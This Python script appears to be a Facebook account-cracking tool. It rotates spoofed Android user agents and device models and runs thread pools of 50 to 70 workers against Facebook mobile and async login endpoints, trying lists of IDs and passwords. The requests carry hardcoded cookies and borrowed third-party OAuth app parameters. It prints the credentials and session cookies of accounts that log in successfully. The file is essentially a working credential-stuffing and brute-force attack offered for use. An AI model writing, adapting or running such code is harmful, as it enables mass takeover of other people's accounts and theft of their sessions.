...
ua = ["Mozilla/5.0 (Linux; Android 11; moto g41 Build/RRWS31.Q3-41-80-9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; VIVO V2026 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.96 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-G930F Build/R16NW; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.78 Mobile Safari/537.36[FBAN/EMA;FBLC/nl_NL;FBAV/306.0.0.13.107;]",]
ua = ["Mozilla/5.0 (Linux; Android 9; SM-G950F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; U; Android 2.3.6; GT-S6802 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1 OPR/20.0.2254.110284",]
ua = ["Mozilla/5.0 (Linux; Android 4.4.4; SM-G316ML) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 14; PJJ110 Build/SKQ1.221119.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.74 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/461.0.0.47.85;]",]
ua = ["Mozilla/5.0 (Linux; Android 11; CPH2109 Build/RKQ1.200903.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/326.0.0.34.120;]",]
ua = ["Mozilla/5.0 (Linux; Android 11; CPH2089 Build/RKQ1.200710.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 ",]
...
def sexy():
	...
	ugent = f"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36"
	return ugent
...
def bori():
	...
	Mu = ['SM-J111F', 'SM-J110F', 'SM-J110H', 'SM-J111M']
	An = ['8.1.0', '6.0.1', '8.0.0', '7.0', '5.1.1']
	return str(rc([f"Mozilla/5.0 (Linux; Android {str(rr(6, 14))}; Android 10; LIO-AN00m) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(80, 105))}.0.{str(rr(1111, 4896))}.{str(rr(100, 400))} Mobile Safari/537.36"]))
...
\033[38;5;46m──────────────────────────────────────────────────
\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] AUTHOR    : PAVEL KHAN
\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] OWNER     : PK - PAVEL
\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] SUPPORT   : \033[38;5;46m64BIT
\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] TOOLS     : \033[38;5;46mPEROSONAL
\033[38;5;46m[\033[38;5;46m=\033[38;5;46m] VERSION   : \033[38;5;46m0.3.2
\033[38;5;46m──────────────────────────────────────────────────""")
...
while attemps < 999999999998888888888889999999999999999999999999999:
    fuck_x = input(f'{H}❲{K}✓{H}❳{K} YOUR LICENSE : ')
...
def error():
  #  print(logo)
	...
	print(f'{G}❲{A}1{G}❳{A} METHOD :{G} X1')
	print(f'{G}❲{A}2{G}❳{A} METHOD :{G} X2');
	mthd = input(f'{G}❲{A}?{G}❳{A} CHOICE :{G}  ')
	...
	with Ngangkang(max_workers=70) as Kanjut:
		...
		for guru in user:
			...
			if mthd in ['1','01']:
				...
				Kanjut.submit(op,idf,pwx,tl,wkt)
	...
	with Ngangkang(max_workers=50) as Kanjut:
		...
		for guru in user:
			...
			if mthd in ['1','01']:
				...
				Kanjut.submit(nd,idf,pwx,tl,wkt)
try:
...
def asy(idf,pwx,tl,wkt):
	...
	print(f"{P}[{G2}PK{A}-{G2}{A}]-[{G}{waktu}{P}]{P}—[{G}{loop}{A}│{G3}{len(user)}{P}]—[{G4}{ok}{A}│{G5}{cp}{P}]", end="\r")
	...
	rr = random.randint
	rc = random.choice
	xoxof = random.choice(['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KO0|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H'])
	for pw in pwx:
		try:
			...
			link = ewe.get("https://touch.facebook.com").text
			data = {
			...
			cookies = {
    'datr': 'VfQeZ2euQubUkndEbzgYqnK_',
    'sb': 'VfQeZ0mvGTvJleA7l12vtWB3',
    'dpr': '3.2983407974243164',
    'ps_l': '1',
    'ps_n': '1',
    'm_pixel_ratio': '3',
    'wd': '891x1741',
    'fr': '0hGPR3dXirJeDpqHv..BnHvRV..AAA.0.0.BnHzAy.AWXMyuyviSQ',
}
    ...
    # 'cookie': 'datr=VfQeZ2euQubUkndEbzgYqnK_; sb=VfQeZ0mvGTvJleA7l12vtWB3; dpr=3.2983407974243164; ps_l=1; ps_n=1; m_pixel_ratio=3; wd=891x1741; fr=0hGPR3dXirJeDpqHv..BnHvRV..AAA.0.0.BnHzAy.AWXMyuyviSQ',
    'dpr': '3',
    ...
    'viewport-width': '980',
			...
			params = {
    'api_key': '361020454636673',
    'auth_token': '4c02d6ad06a5e7ef30018a775b6df998',
    'skip_api_login': '1',
    'signed_next': '1',
    'next': 'https://m.facebook.com/dialog/oauth?type=web_server&client_id=361020454636673&redirect_uri=https%3A%2F%2Fpayorportal.revopay.com%2Findex.php%2Fapi%2Fconnect%2Ffb&response_type=code&scope=email%2Cpublic_profile&state=283b5b54bb7babe922e430c7f001a65f&ret=login&fbapp_pres=0&logger_id=313468b2-d1fb-4afb-88bb-2a73bb01a6a4&tp=unspecified',
    'refsrc': 'deprecated',
    'app_id': '361020454636673',
    'cancel': 'https://payorportal.revopay.com/index.php/api/connect/fb?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=283b5b54bb7babe922e430c7f001a65f#_=_',
    'lwv': '100',
}

			response = ewe.post("https://web.facebook.com/login/device-based/login/async/?api_key=361020454636673&auth_token=4c02d6ad06a5e7ef30018a775b6df998&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Ftype%3Dweb_server%26client_id%3D361020454636673%26redirect_uri%3Dhttps%253A%252F%252Fpayorportal.revopay.com%252Findex.php%252Fapi%252Fconnect%252Ffb%26response_type%3Dcode%26scope%3Demail%252Cpublic_profile%26state%3D283b5b54bb7babe922e430c7f001a65f%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D313468b2-d1fb-4afb-88bb-2a73bb01a6a4%26tp%3Dunspecified&refsrc=deprecated&app_id=361020454636673&cancel=https%3A%2F%2Fpayorportal.revopay.com%2Findex.php%2Fapi%2Fconnect%2Ffb%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D283b5b54bb7babe922e430c7f001a65f%23_%3D_&lwv=100",
				data = data,
				cookies=cookies,
				params=params,
				headers = headers,
			...
			if "checkpoint" in ewe.cookies.get_dict():
				...
				print(f"\r{B}❲{G}PK-OK{B}❳{G} {ids} | {pw}")
				print(f"\r\r{H}❲{K}COOKIE{H}❳>{K} {coki}")
...
def op(idf,pwx,tl,wkt):
	...
	for pw in pwx:
		try:
			...
			link = ewe.get("hhttps://touch.facebook.com").text
			data = {
				"m_ts": re.search('name="m_ts" value="(.*?)"', str(link)).group(1),
				"li": re.search('name="li" value="(.*?)"', str(link)).group(1),
				"try_number": 0,
				...
				"lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1)}
			cookies = {
 			   'sb': 'QUozZtcjcOvPk6QHaxLJbq5J',
			    'datr': 'QUozZtE4dE-tb7EtF0wh4SOI',
 			   'm_pixel_ratio': '2.75',
 			   'wd': '393x713',
  			  'ps_n': '1',
 			   'ps_l': '1',
    			'fr': '0fh0f2sKnAy9AtP7c..BmM0pB..AAA.0.0.BmM0pm.AWWf-UYiajI',
}
			headers = {
"Host": "m.facebook.com",
"content-length": "2049",
...
"referer": "https://m.facebook.com/login.php?skip_api_login=1&api_key=1489897304628200&kid_directed_site=0&app_id=1489897304628200&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fapp_id%3D1489897304628200%26cbt%3D1713930599276%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df02542cd8dfb53655%2526domain%253Dwww.blibli.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.blibli.com%25252Ff40713ec2224c4b04%2526relation%253Dopener%26client_id%3D1489897304628200%26display%3Dtouch%26domain%3Dwww.blibli.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.blibli.com%252Flogin%253Fredirect%253D%25252Faccount%26locale%3Den_US%26logger_id%3Df46daa9bbb80cd3cf%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df392f42795c7eb191%2526domain%253Dwww.blibli.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.blibli.com%25252Ff40713ec2224c4b04%2526relation%253Dopener%2526frame%253Df60dbccf7ce0a7501%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv15.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df392f42795c7eb191%26domain%3Dwww.blibli.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.blibli.com%252Ff40713ec2224c4b04%26relation%3Dopener%26frame%3Df60dbccf7ce0a7501%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated&_rdr",
"accept-encoding": "gzip, deflate, br",
"accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
}
			params = {
    'api_key': '1489897304628200',
    'auth_token': 'ffbbfd9fd305eb39324902fd6258fe17',
    'skip_api_login': '1',
    'signed_next': '1',
    'next': 'https://m.facebook.com/v15.0/dialog/oauth?app_id=1489897304628200&cbt=1713930599276&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df02542cd8dfb53655%26domain%3Dwww.blibli.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.blibli.com%252Ff40713ec2224c4b04%26relation%3Dopener&client_id=1489897304628200&display=touch&domain=www.blibli.com&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fwww.blibli.com%2Flogin%3Fredirect%3D%252Faccount&locale=en_US&logger_id=f46daa9bbb80cd3cf&origin=2&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df392f42795c7eb191%26domain%3Dwww.blibli.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.blibli.com%252Ff40713ec2224c4b04%26relation%3Dopener%26frame%3Df60dbccf7ce0a7501&response_type=token%2Csigned_request%2Cgraph_domain&scope=public_profile%2Cemail&sdk=joey&version=v15.0&ret=login&fbapp_pres=0&tp=unspecified',
    'refsrc': 'deprecated',
    'app_id': '1489897304628200',
    'cancel': 'https://staticxx.facebook.com/x/connect/xd_arbiter/?version=46#cb=f392f42795c7eb191&domain=www.blibli.com&is_canvas=false&origin=https%3A%2F%2Fwww.blibli.com%2Ff40713ec2224c4b04&relation=opener&frame=f60dbccf7ce0a7501&error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied',
    'lwv': '100',
}
			response = ewe.post("https://m.facebook.com/login/device-based/login/async/?api_key=1489897304628200&auth_token=ffbbfd9fd305eb39324902fd6258fe17&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv15.0%2Fdialog%2Foauth%3Fapp_id%3D1489897304628200%26cbt%3D1713930599276%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df02542cd8dfb53655%2526domain%253Dwww.blibli.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.blibli.com%25252Ff40713ec2224c4b04%2526relation%253Dopener%26client_id%3D1489897304628200%26display%3Dtouch%26domain%3Dwww.blibli.com%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.blibli.com%252Flogin%253Fredirect%253D%25252Faccount%26locale%3Den_US%26logger_id%3Df46daa9bbb80cd3cf%26origin%3D2%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df392f42795c7eb191%2526domain%253Dwww.blibli.com%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.blibli.com%25252Ff40713ec2224c4b04%2526relation%253Dopener%2526frame%253Df60dbccf7ce0a7501%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Dpublic_profile%252Cemail%26sdk%3Djoey%26version%3Dv15.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&refsrc=deprecated&app_id=1489897304628200&cancel=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df392f42795c7eb191%26domain%3Dwww.blibli.com%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.blibli.com%252Ff40713ec2224c4b04%26relation%3Dopener%26frame%3Df60dbccf7ce0a7501%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&lwv=100",
				data = data,
				cookies=cookies,
				headers = headers,
				params=params,
	...
	for pw in pwx:
		try:
			...
			data = {
				...
				"lsd": re.search('name="lsd" value="(.*?)"', str(link)).group(1)}
			cookies = {
			    'sb': 'cwQzZt9CcW3r9ajVEpotDQ0h',
			    'datr': 'cwQzZpC6LTDe9cDo7Dxza2hR',
 			   'm_pixel_ratio': '3',
			    'wd': '360x703',
 			   'fr': '07l7dzporzYSji1oy..BmMwRz..AAA.0.0.BmMwZf.AWVZPtKcCBU',
}
			headers = {
				...
				"sec-fetch-mode": "cors",
				"sec-fetch-dest": "empty",
				"referer": "https://www.facebook.com/?wtsid=rdr_0iD89ZC5eO1TGcyne&rtime=1714619990&hrc=1&refsrc=deprecated&_rdr",
				"accept-encoding": "gzip, deflate, br",
				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
				}
			response = ewe.post("https://www.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",
				data = data,
				cookies=cookies,
				headers = headers,
				allow_redirects = False,
